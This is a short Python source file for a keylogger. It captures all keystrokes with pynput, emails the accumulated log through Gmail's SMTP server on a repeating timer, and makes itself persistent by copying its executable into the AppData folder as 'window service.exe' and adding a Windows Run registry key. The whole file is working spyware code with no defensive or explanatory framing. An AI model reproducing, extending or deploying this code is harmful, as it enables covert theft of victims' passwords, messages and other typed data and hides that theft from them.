#!/usr/bin/env python
import threading
import pynput
import smtplib
import os, shutil, subprocess,sys


SMTP_SEVER_URL = "smtp.gmail.com"
SMTP_PORT = 587
REG_ADD='reg add HKCU\Software\Microsoft\windows\currentversion\Run'




class Klogger:

   def __init__(self, USERNAME, PASSWORD, INTERVAL=5):
      self.log = "[+] KEY LOGGER STARTED !"
      self.USERNAME = USERNAME
      self.PASSWORD = PASSWORD
      self.INTERVAL = INTERVAL

   def send_email(self, email, password, msg, subject = "") :
      server = smtplib.SMTP(SMTP_SEVER_URL, SMTP_PORT)
      server.starttls()
      server.login(email,password)
      server.sendmail(email,email,"\n\n"+msg)
      server.quit()
   
   def process_input(self, key):
      try:
         self.log += str(key.char)
      except AttributeError:
         if key == key.space:
            self.log += " "
         else:
            self.log += " "+ str(key) +" "

   
   def repport(self):
      self.send_email(self.USERNAME, self.PASSWORD, self.log)
      self.log = ""
      timer = threading.Timer(self.INTERVAL, self.repport)
      timer.start()
   
   
   def start(self):
      with  pynput.keyboard.Listener(on_press= self.process_input) as listener:
         self.repport()
         listener.join()
   
   def run_at_startup(self):
      LOCATION = os.environ["appdata"]+"\\window service.exe"
      if not os.path.exists(LOCATION):
         shutil.copyfile(sys.executable, LOCATION)
         subprocess.call(REG_ADD + ' /v "win service" /t REG_SZ /d "' + LOCATION + '"')
